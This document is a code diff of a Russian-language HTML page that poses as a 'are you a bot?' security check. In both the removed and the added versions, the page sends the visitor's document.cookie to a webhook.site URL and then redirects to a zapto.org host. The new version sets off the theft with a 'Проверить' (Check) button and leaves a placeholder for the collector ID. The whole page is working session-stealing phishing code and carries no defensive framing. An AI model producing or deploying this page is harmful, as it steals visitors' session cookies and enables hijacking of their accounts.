@@ -2,26 +2,23 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Вы не бот?</title>
+  <title>Проверка безопасности</title>
   <style>
     body {
-      background: #eef2f7;
-      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      font-family: sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
       margin: 0;
     }
-    .container {
+    .box {
       background: white;
-      padding: 40px;
+      padding: 30px;
       border-radius: 10px;
       text-align: center;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-    }
-    h2 {
-      margin-bottom: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     .spinner {
       border: 6px solid #f3f3f3;
@@ -29,29 +26,45 @@
       border-radius: 50%;
       width: 50px;
       height: 50px;
-      margin: 20px auto;
       animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
     }
     @keyframes spin {
-      0% { transform: rotate(0deg); }
+      0% { transform: rotate(0); }
       100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Проверка: вы не бот</h2>
-    <p>Идёт анализ сессии безопасности...</p>
+  <div class="box">
+    <h2>Вы не бот?</h2>
+    <p>Нажмите кнопку для продолжения</p>
     <div class="spinner"></div>
+    <button onclick="sendCookies()">Проверить</button>
   </div>
 
   <script>
-    fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + document.cookie)
-      .then(() => {
-        setTimeout(() => {
-          window.location.href = "https://kazcyber.zapto.org/index.php";
-        }, 3000);
-      });
+    function sendCookies() {
+      fetch("https://webhook.site/ВАШ-ID?cookie=" + document.cookie)
+        .then(() => {
+          setTimeout(() => {
+            window.location.href = "https://kazcyber.zapto.org/index.php";
+          }, 3000);
+        });
+    }
   </script>
 </body>
 </html>
